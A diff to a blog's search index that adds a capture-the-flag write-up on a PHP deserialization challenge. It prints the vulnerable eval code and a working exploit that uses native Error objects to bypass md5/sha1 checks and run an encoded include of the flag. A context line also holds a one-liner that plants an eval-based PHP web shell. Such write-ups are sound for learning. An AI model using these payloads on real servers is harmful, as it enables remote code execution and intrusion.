@@ -776,4 +776,17 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 
 ]]></content>
   </entry>
+  <entry>
+    <title>greatphp</title>
+    <url>/2022/12/14/wu/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>观察到反序列化的wakeup利用，syc属性会经过一次正则匹配</p>
+<p>可以找一个含有__toString的类，来返回值。</p>
+<p>用原生类Error</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a=new Error($str,1);$b=new Error($str,2);</span><br><span class="line">$c = new SYCLOVER();</span><br><span class="line">$c-&gt;syc = $a;</span><br><span class="line">$c-&gt;lover = $b;</span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/14/wu/3.jpg" alt="题图"></p>
+]]></content>
+  </entry>
 </search>
